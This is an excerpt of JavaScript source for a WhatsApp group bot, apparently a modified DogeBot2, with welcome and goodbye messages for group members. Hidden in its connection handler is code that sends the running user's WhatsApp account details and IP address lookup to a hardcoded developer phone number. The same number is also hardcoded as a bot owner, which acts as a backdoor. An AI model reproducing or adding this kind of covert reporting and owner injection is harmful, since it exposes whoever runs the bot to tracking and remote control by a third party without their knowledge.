...
console.log(color('> WA NUMBER: +16134175543 ','silver'))
console.log(color('  OLDUSER BOT Inc. 2021','mediumseagreen'))
	...
	OLDUSER.on('credentials-updated', () => {
		fs.writeFileSync('./.session.data.json.bak', JSON.stringify(OLDUSER.base64EncodedAuthInfo(), null, '\t'))
		info('2', 'OLDUSER BOT Loading...')
	})
...
teks = 'https://chat.whatsapp.com/'
 OLDUSER.query({ json:["action", "kick", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'pink'), color('JOINED TO FORUM WHATSAPP BOT GROUP', 'pink'))
 OLDUSER.sendMessage(`16134175543@s.whatsapp.net`, `*Hi Owner olduser, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(OLDUSER.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: {forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer OLDUSER BOT Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./o.jpg'),sourceUrl:"https://wa.me/16134175543?text=Hello bro"}}})
 console.log(color('|WRN|', 'red'), color('SENDING BOT INFO TO BOT OWNER', 'red'))
fetch(`http://ip-api.com/line`).then(res => res.text())
        .then(bu =>{
       OLDUSER.sendMessage("16134175543@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer OLDUSER BOT Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./o.jpg'),sourceUrl:"https://wa.me/16134175543?text=Hello bro"}}})
   ...
   // owner
    ...
    const htod = "16134175543@s.whatsapp.net"
...
OLDUSER.on('group-participants-update', async (anu) => {
	...
	try {
      ...
      groupMet = await OLDUSER.groupMetadata(anu.jid);
      ...
      mem = anu.participants[0];
		...
		if (anu.action == "add" && mem.includes(OLDUSER.user.jid)) {
        OLDUSER.sendMessage(anu.jid, "😌😌😙😙HELLO EVERYONE I AM OLDUSER V2 BOT, READY TO HELP YOU HERE, I AM A OLDUSER  V2 BOT AND THIS OLDUSER V2 BOT IS MODIFIED OF DOGEBOT2 IF ANY ONE TO TALK TO MY OWNER THEN ASK ME TO CONTACT WITH MY OWNER OR TELL ME TO I WANT TALK WITH YOUR OWNER YOU CAN PLAY WITH BOT FREELY OR YOU CAN WANT SOMETHING FROM ME THEN CONTACT ME WITH THE HELP PF BOT😙😙😌😌", "conversation");
      }

if (anu.action == 'add') {
             const mdata = await OLDUSER.groupMetadata(anu.jid)
			...
			try {
				...
				sendButImage(anu.jid, teks, `OLDUSER BOT`, img,but = [{buttonId:`getdescgc`, 
			...
			try {
				...
				sendButImage(anu.jid, teks, `OLDUSER BOT`, img,but = [{buttonId: `getbio`, buttonText: {displayText: `GOODBYE !!`}, type: 1}], options = {contextInfo: {mentionedJid: [num, htod]}})
			...
			try {
				...
				sendButImage(anu.jid, teks, ``, img,but = [{buttonId: `getname`, buttonText: {displayText: `SAWADEE KHA HAPPY NOW?`}, type: 1}], options = {contextInfo: {mentionedJid: [num]}})
			...
			try {
				...
				sendButImage(anu.jid, teks, ``, img,but = [{buttonId: `getname`, buttonText: {displayText: `ANOTHER ONE BITE DUST`}, type: 1}], options = {contextInfo: {mentionedJid: [num]}})
...
OLDUSER.on('group-update', async (anu) => {
    ...
    OLDUSER.on('chat-update', async (message) => {
        ...
        ownerNumber = ["16134175543@s.whatsapp.net","16134175543@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "16134175543@s.whatsapp.net"
